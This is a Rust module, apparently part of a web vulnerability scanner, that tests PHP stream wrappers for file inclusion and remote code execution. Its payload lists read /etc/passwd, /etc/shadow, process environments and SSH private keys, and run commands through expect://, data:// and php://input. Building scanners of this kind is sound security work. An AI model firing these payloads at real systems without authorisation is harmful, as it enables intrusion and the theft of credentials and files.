//! PHP Wrapper LFI Detection Module
//!
//! Tests PHP wrappers (php://filter, php://input, expect://, data://, etc.) for code execution and file disclosure.

use async_trait::async_trait;
use std::sync::Arc;
use std::time::Duration;
use bytes::Bytes;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::AnalysisContext;
use crate::payload::PayloadRegistry;
use crate::http::client::HttpClient;

/// PHP wrapper definition
#[derive(Debug, Clone)]
pub struct PhpWrapper {
    pub name: &'static str,
    pub prefix: &'static str,
    pub payloads: &'static [&'static str],
    pub detection_patterns: &'static [&'static str],
    pub severity: FindingSeverity,
    pub description: &'static str,
    pub requires_config: bool,
}

/// PHP wrapper LFI module
pub struct PhpWrappersModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
    wrappers: Vec<PhpWrapper>,
}

impl PhpWrappersModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
            wrappers: Self::define_wrappers(),
        }
    }

    /// Define all PHP wrappers to test
    fn define_wrappers() -> Vec<PhpWrapper> {
        vec![
            // php://filter - read file with encoding
            PhpWrapper {
                name: "php://filter",
                prefix: "php://filter/",
                payloads: &[
                    "php://filter/read=string.rot13/resource=/etc/passwd",
                    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
                    "php://filter/read=convert.base64-encode/resource=/etc/shadow",
                    "php://filter/read=convert.base64-encode/resource=/proc/self/environ",
                    "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php",
                    "php://filter/read=convert.base64-encode/resource=index.php",
                    "php://filter/read=string.toupper/resource=/etc/passwd",
                    "php://filter/read=string.tolower/resource=/etc/passwd",
                    "php://filter/read=string.strip_tags/resource=/etc/passwd",
                    "php://filter/read=convert.quoted-printable-encode/resource=/etc/passwd",
                    "php://filter/read=convert.iconv.utf-8.utf-16/resource=/etc/passwd",
                    "php://filter/read=convert.iconv.utf-8.utf-32/resource=/etc/passwd",
                    "php://filter/read=zlib.deflate/resource=/etc/passwd",
                    "php://filter/read=zlib.inflate/resource=/etc/passwd",
                    "php://filter/read=bzip2.compress/resource=/etc/passwd",
                    "php://filter/read=bzip2.decompress/resource=/etc/passwd",
                ],
                detection_patterns: &[
                    "root:", "daemon:", "bin:", "sys:", "nobody:",
                    "PD9waHA", "PCEtLQ", "base64", "rot13",
                ],
                severity: FindingSeverity::High,
                description: "PHP filter wrapper for file disclosure with encoding",
                requires_config: false,
            },
            
            // php://input - read raw POST data
            PhpWrapper {
                name: "php://input",
                prefix: "php://input",
                payloads: &[
                    "php://input",
                    "php://input%00",
                ],
                detection_patterns: &[
                    "PD9waHA", "<?php", "<?=", "eval(", "assert(", "system(", "exec(", "shell_exec(",
                    "passthru(", "proc_open(", "popen(", "pcntl_exec(",
                ],
                severity: FindingSeverity::Critical,
                description: "PHP input wrapper for RCE via POST data",
                requires_config: false,
            },
            
            // expect:// - execute command (requires expect extension)
            PhpWrapper {
                name: "expect://",
                prefix: "expect://",
                payloads: &[
                    "expect://id",
                    "expect://whoami",
                    "expect://ls -la",
                    "expect://cat /etc/passwd",
                    "expect://uname -a",
                    "expect://pwd",
                    "expect://which python",
                    "expect://which perl",
                    "expect://which bash",
                ],
                detection_patterns: &[
                    "uid=", "gid=", "groups=", "root:", "daemon:",
                    "Linux", "Darwin", "FreeBSD", "/bin/bash", "/bin/sh",
                    "python", "perl", "bash",
                ],
                severity: FindingSeverity::Critical,
                description: "Expect wrapper for command execution",
                requires_config: true,
            },
            
            // data:// - data URI wrapper
            PhpWrapper {
                name: "data://",
                prefix: "data://",
                payloads: &[
                    "data://text/plain,<?php system('id'); ?>",
                    "data://text/plain,<?php echo 'test'; ?>",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
                    "data://text/plain;base64,PD9waHAgZWNobyAnSGVsbG8gV29ybGQnOyA/Pg==",
                    "data://text/plain,<?php phpinfo(); ?>",
                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                ],
                detection_patterns: &[
                    "uid=", "gid=", "groups=", "PHP Version", "PHP Extension",
                    "Build Date", "Server API", "Configuration File",
                ],
                severity: FindingSeverity::Critical,
                description: "Data wrapper for code execution",
                requires_config: true,
            },
            
            // phar:// - PHP Archive wrapper
            PhpWrapper {
                name: "phar://",
                prefix: "phar://",
                payloads: &[
                    "phar:///etc/passwd",
                    "phar:///var/www/html/uploaded_file.jpg",
                    "phar:///tmp/uploaded_file.png",
                    "phar://./uploaded_file.jpg",
                ],
                detection_patterns: &[
                    "root:", "daemon:", "bin:", "sys:",
                    "PD9waHA", "<?php", "__HALT_COMPILER",
                ],
                severity: FindingSeverity::High,
                description: "PHAR wrapper for deserialization and file read",
                requires_config: false,
            },
            
            // zip:// - ZIP archive wrapper
            PhpWrapper {
                name: "zip://",
                prefix: "zip://",
                payloads: &[
                    "zip:///etc/passwd#passwd",
                    "zip:///var/www/html/uploaded_file.zip#shell.php",
                    "zip://./uploaded_file.zip#shell.php",
                ],
                detection_patterns: &[
                    "root:", "daemon:", "PD9waHA", "<?php",
                ],
                severity: FindingSeverity::High,
                description: "ZIP wrapper for archive file read",
                requires_config: false,
            },
            
            // compress.zlib:// - zlib compression wrapper
            PhpWrapper {
                name: "compress.zlib://",
                prefix: "compress.zlib://",
                payloads: &[
                    "compress.zlib:///etc/passwd",
                    "compress.zlib:///var/log/apache2/access.log",
                    "compress.zlib:///proc/self/environ",
                ],
                detection_patterns: &[
                    "root:", "daemon:", "GET ", "POST ", "PATH=", "HOME=",
                ],
                severity: FindingSeverity::Medium,
                description: "Zlib compression wrapper for file read",
                requires_config: false,
            },
            
            // compress.bzip2:// - bzip2 compression wrapper
            PhpWrapper {
                name: "compress.bzip2://",
                prefix: "compress.bzip2://",
                payloads: &[
                    "compress.bzip2:///etc/passwd",
                    "compress.bzip2:///var/log/nginx/access.log",
                ],
                detection_patterns: &[
                    "root:", "daemon:", "GET ", "POST ",
                ],
                severity: FindingSeverity::Medium,
                description: "Bzip2 compression wrapper for file read",
                requires_config: false,
            },
            
            // glob:// - filesystem glob wrapper
            PhpWrapper {
                name: "glob://",
                prefix: "glob://",
                payloads: &[
                    "glob:///etc/*",
                    "glob:///var/www/html/*.php",
                    "glob:///tmp/*",
                    "glob:///home/*/.ssh/id_rsa",
                ],
                detection_patterns: &[
                    "passwd", "shadow", "hosts", "index.php", "config.php",
                    "id_rsa", "authorized_keys",
                ],
                severity: FindingSeverity::Medium,
                description: "Glob wrapper for directory listing",
                requires_config: false,
            },
            
            // ssh2.sftp:// - SSH2 SFTP wrapper
            PhpWrapper {
                name: "ssh2.sftp://",
                prefix: "ssh2.sftp://",
                payloads: &[
                    "ssh2.sftp://user:pass@127.0.0.1/etc/passwd",
                    "ssh2.sftp://user@127.0.0.1/etc/passwd",
                ],
                detection_patterns: &[
                    "root:", "daemon:",
                ],
                severity: FindingSeverity::High,
                description: "SSH2 SFTP wrapper for remote file read",
                requires_config: true,
            },
            
            // ogg:// - OGG wrapper (can be abused for file read)
            PhpWrapper {
                name: "ogg://",
                prefix: "ogg://",
                payloads: &[
                    "ogg:///etc/passwd",
                ],
                detection_patterns: &[
                    "root:", "daemon:",
                ],
                severity: FindingSeverity::Low,
                description: "OGG wrapper for file read",
                requires_config: false,
            },
        ]
    }

    /// Test a PHP wrapper payload
    async fn test_wrapper(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        wrapper: &PhpWrapper,
        payload: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(payload));
        
        let response = self.http_client
            .get(&test_url)
            .timeout(Duration::from_millis(5000))
            .send()
            .await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let status = response.status().as_u16();
        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = response.bytes().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        // Check if wrapper worked
        if self.is_wrapper_successful(&body, wrapper) {
            // Additional validation for false positives
            if self.is_false_positive(&body, &headers, status) {
                return Ok(None);
            }

            let evidence = self.create_evidence(&test_url, &body, &headers, status, payload, wrapper);
            let finding = Finding::new(
                "php_wrapper_lfi",
                wrapper.severity,
                format!("PHP Wrapper LFI ({})", wrapper.name),
                format!("PHP wrapper '{}' allows file disclosure/RCE via parameter '{}': {}", 
                    wrapper.name, param_name, wrapper.description),
                &ctx.target_url,
            )
            .with_method("GET")
            .with_payload(payload.to_string())
            .with_evidence(evidence)
            .with_confidence(90)
            .with_tags(vec!["lfi", "php-wrapper", wrapper.name.replace("://", ""), "code-execution"])
            .with_cwe("CWE-98")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        Ok(None)
    }

    /// Test php://input with POST data for RCE
    async fn test_php_input_post(
        &self,
        ctx: &CheckContext,
        param_name: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        let test_url = format!("{}?{}=", ctx.target_url, param_name);
        
        // PHP code to execute
        let php_code = "<?php system('id'); ?>";
        
        let response = self.http_client
            .post(&test_url)
            .body(php_code.to_string())
            .header("Content-Type", "application/x-www-form-urlencoded")
            .timeout(Duration::from_millis(5000))
            .send()
            .await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let status = response.status().as_u16();
        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = response.bytes().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let body_str = String::from_utf8_lossy(&body);
        
        if body_str.contains("uid=") && body_str.contains("gid=") {
            let evidence = self.create_post_evidence(&test_url, &body, &headers, status, php_code);
            let finding = Finding::new(
                "php_input_rce",
                FindingSeverity::Critical,
                "PHP Input Wrapper RCE",
                format!("php://input allows RCE via POST data in parameter '{}'", param_name),
                &ctx.target_url,
            )
            .with_method("POST")
            .with_payload(php_code.to_string())
            .with_evidence(evidence)
            .with_confidence(95)
            .with_tags(vec!["lfi", "php-wrapper", "php-input", "rce", "post"])
            .with_cwe("CWE-98")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        Ok(None)
    }

    /// Check if wrapper payload was successful
    fn is_wrapper_successful(&self, body: &Bytes, wrapper: &PhpWrapper) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        for pattern in wrapper.detection_patterns {
            if body_str.contains(pattern) {
                return true;
            }
        }
        
        false
    }

    /// Check for false positive indicators
    fn is_false_positive(&self, body: &Bytes, headers: &[(String, String)], status: u16) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        let false_positive_patterns = [
            "failed to open stream",
            "no such file",
            "permission denied",
            "access denied",
            "forbidden",
            "unauthorized",
            "internal server error",
            "service unavailable",
            "bad gateway",
            "gateway timeout",
            "wrapper is not supported",
            "unable to locate stream wrapper",
            "unknown protocol",
            "invalid wrapper",
            "stream wrapper",
        ];

        for pattern in &false_positive_patterns {
            if body_str.to_lowercase().contains(pattern) {
                return true;
            }
        }

        if status >= 400 && body.len() < 500 {
            return true;
        }

        false
    }

    /// Create evidence for wrapper finding
    fn create_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        payload: &str,
        wrapper: &PhpWrapper,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("PHP wrapper LFI: wrapper={}, payload='{}', status={}, bytes={}", 
                wrapper.name, payload, status, body.len()),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 90,
        }
    }

    /// Create evidence for POST-based php://input
    fn create_post_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        php_code: &str,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("POST {} HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n{}", test_url, php_code);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("PHP input RCE: php_code='{}', status={}, bytes={}", php_code, status, body.len()),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 95,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for PhpWrappersModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("PHP Wrappers LFI module initialized with {} wrappers", self.wrappers.len());
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "php_wrappers_lfi",
                "PHP Wrapper LFI/RCE",
                "Tests PHP wrappers (php://filter, php://input, expect://, data://, phar://, zip://) for code execution and file disclosure",
                Severity::Critical,
                CheckCategory::PathTraversal,
            )
            .with_budget(ResourceBudget::advanced())
            .with_god_mode(true)
            .with_tags(vec!["lfi", "php-wrapper", "php-filter", "php-input", "expect", "data", "phar", "zip", "rce"])
            .with_references(vec![
                "https://www.php.net/manual/en/wrappers.php",
                "https://portswigger.net/web-security/file-path-traversal",
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata().requires_god_mode && !ctx.god_mode {
            return false;
        }
        ctx.target_url.contains('?') || ctx.target_url.contains('=')
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(200);

        // Extract parameters
        let params = self.extract_parameters(&ctx.target_url);
        
        if params.is_empty() {
            return Ok(CheckResult {
                findings,
                executed: true,
                timed_out: false,
                resource_usage: Default::default(),
            });
        }

        // Test each wrapper
        for wrapper in &self.wrappers {
            for payload in wrapper.payloads {
                for param in &params {
                    if request_count >= max_requests {
                        break;
                    }

                    if let Some(finding) = self.test_wrapper(&ctx, param, wrapper, payload).await? {
                        findings.push(finding);
                    }
                    request_count += 1;
                }
            }
        }

        // Test php://input with POST for RCE
        if request_count < max_requests {
            for param in &params {
                if request_count >= max_requests {
                    break;
                }

                if let Some(finding) = self.test_php_input_post(&ctx, param).await? {
                    findings.push(finding);
                }
                request_count += 1;
            }
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        25 // High priority - advanced check
    }

    fn dependencies(&self) -> &[&str] {
        &["basic_lfi"]
    }
}

impl PhpWrappersModule {
    /// Extract parameter names from URL
    fn extract_parameters(&self, url: &str) -> Vec<String> {
        let mut params = Vec::new();
        
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let param = &pair[..eq_pos];
                    if !param.is_empty() {
                        params.push(param.to_string());
                    }
                }
            }
        }
        
        if let Ok(parsed) = url::Url::parse(url) {
            for segment in parsed.path_segments().unwrap_or_default() {
                if segment.starts_with(':') || segment.starts_with('{') {
                    params.push(segment.trim_start_matches(':').trim_start_matches('{').trim_end_matches('}').to_string());
                }
            }
        }
        
        params
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_define_wrappers() {
        let wrappers = PhpWrappersModule::define_wrappers();
        
        assert!(!wrappers.is_empty());
        assert!(wrappers.iter().any(|w| w.name == "php://filter"));
        assert!(wrappers.iter().any(|w| w.name == "php://input"));
        assert!(wrappers.iter().any(|w| w.name == "expect://"));
        assert!(wrappers.iter().any(|w| w.name == "data://"));
        assert!(wrappers.iter().any(|w| w.name == "phar://"));
        assert!(wrappers.iter().any(|w| w.name == "zip://"));
        assert!(wrappers.iter().any(|w| w.name == "compress.zlib://"));
        assert!(wrappers.iter().any(|w| w.name == "compress.bzip2://"));
        assert!(wrappers.iter().any(|w| w.name == "glob://"));
        assert!(wrappers.iter().any(|w| w.name == "ssh2.sftp://"));
        assert!(wrappers.iter().any(|w| w.name == "ogg://"));
    }

    #[test]
    fn test_php_filter_payloads() {
        let wrappers = PhpWrappersModule::define_wrappers();
        let filter = wrappers.iter().find(|w| w.name == "php://filter").unwrap();
        
        assert!(filter.payloads.iter().any(|p| p.contains("convert.base64-encode")));
        assert!(filter.payloads.iter().any(|p| p.contains("string.rot13")));
        assert!(filter.payloads.iter().any(|p| p.contains("/etc/passwd")));
    }

    #[test]
    fn test_php_input_payloads() {
        let wrappers = PhpWrappersModule::define_wrappers();
        let input = wrappers.iter().find(|w| w.name == "php://input").unwrap();
        
        assert!(input.payloads.contains(&"php://input"));
    }

    #[test]
    fn test_expect_payloads() {
        let wrappers = PhpWrappersModule::define_wrappers();
        let expect = wrappers.iter().find(|w| w.name == "expect://").unwrap();
        
        assert!(expect.payloads.iter().any(|p| p.contains("id")));
        assert!(expect.payloads.iter().any(|p| p.contains("whoami")));
        assert!(expect.payloads.iter().any(|p| p.contains("cat /etc/passwd")));
    }

    #[test]
    fn test_data_payloads() {
        let wrappers = PhpWrappersModule::define_wrappers();
        let data = wrappers.iter().find(|w| w.name == "data://").unwrap();
        
        assert!(data.payloads.iter().any(|p| p.contains("base64")));
        assert!(data.payloads.iter().any(|p| p.contains("system('id')")));
        assert!(data.payloads.iter().any(|p| p.contains("phpinfo()")));
    }

    #[test]
    fn test_is_wrapper_successful() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = PhpWrappersModule::new(http_client, analysis_ctx, payload_registry);
        
        let wrapper = module.wrappers.iter().find(|w| w.name == "php://filter").unwrap();
        let body = Bytes::from("root:x:0:0:root:/root:/bin/bash");
        
        assert!(module.is_wrapper_successful(&body, wrapper));
    }

    #[test]
    fn test_is_false_positive() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = PhpWrappersModule::new(http_client, analysis_ctx, payload_registry);
        
        let body = Bytes::from("failed to open stream: No such file or directory");
        let headers = vec![];
        
        assert!(module.is_false_positive(&body, &headers, 500));
    }

    #[test]
    fn test_extract_parameters() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = PhpWrappersModule::new(http_client, analysis_ctx, payload_registry);
        
        let params = module.extract_parameters("http://example.com/api?file=test&path=docs");
        assert_eq!(params, vec!["file", "path"]);
    }
}